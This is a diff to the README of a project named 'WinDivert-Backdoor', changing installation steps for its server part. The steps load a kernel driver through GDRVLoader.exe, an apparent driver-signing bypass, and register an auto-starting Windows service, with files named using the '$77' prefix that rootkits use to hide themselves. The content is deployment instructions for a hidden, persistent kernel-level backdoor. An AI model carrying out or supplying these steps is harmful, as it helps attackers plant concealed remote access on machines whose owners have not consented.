@@ -1,7 +1,7 @@
 # WinDivert-Backdoor
 ## Server
 1. Install driver with GDRVLoader.exe </br>
-`GDRVLoader.exe $77kernel.sys` 
+`GDRVLoader.exe C:\$77folder\$77kernel.sys` 
 3. Install service </br>
 `sc create $77service binPath= "C:\$77folder\$77service.exe" start= auto`
 5. Start service </br>
